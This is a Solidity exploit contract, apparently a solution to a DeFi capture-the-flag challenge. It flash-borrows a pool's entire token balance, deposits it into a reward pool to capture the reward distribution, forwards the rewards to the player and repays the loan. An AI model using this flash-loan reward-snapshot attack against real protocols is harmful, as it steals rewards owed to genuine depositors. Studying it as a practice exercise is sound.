// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import {RewardToken} from "./RewardToken.sol";
import {AccountingToken} from "./AccountingToken.sol";
import "hardhat/console.sol";

contract TheRewarderPoolHack {
    address public player;
    FlashLoanerPool public flPool;
    TheRewarderPool public rPool;
    DamnValuableToken public dvToken;
    RewardToken public rToken;
    AccountingToken public aToken;

    function hack(
        address flpAdrs,
        address rpAdrs,
        address p
    ) external {
        console.log("Hack started");
        player = p;
        flPool = FlashLoanerPool(flpAdrs);
        rPool = TheRewarderPool(rpAdrs);
        dvToken = DamnValuableToken(flPool.liquidityToken());
        aToken = AccountingToken(rPool.accountingToken());
        rToken = RewardToken(rPool.rewardToken());

        console.log("Getting the loan");
        flPool.flashLoan(dvToken.balanceOf(flpAdrs));
    }

    function receiveFlashLoan(uint256) external {
        console.log(
            "Deposit to the rewarder the amount: ",
            dvToken.balanceOf(address(this))
        );
        dvToken.approve(address(rPool), dvToken.balanceOf(address(this)));

        console.log("Getting the reward");
        rPool.deposit(dvToken.balanceOf(address(this)) - 1);
        rPool.distributeRewards();

        console.log("Sending the reward");
        rToken.transfer(player, rToken.balanceOf(address(this)));

        rPool.withdraw(aToken.balanceOf(address(this)));
        console.log(
            "Withdraw from the rewarder, I have: ",
            dvToken.balanceOf(address(this))
        );

        console.log("Paying back the loan");
        dvToken.transfer(msg.sender, dvToken.balanceOf(address(this)));
        console.log(
            "I sent the loan back, now I have: ",
            dvToken.balanceOf(address(this))
        );
    }

    receive() external payable {}
}
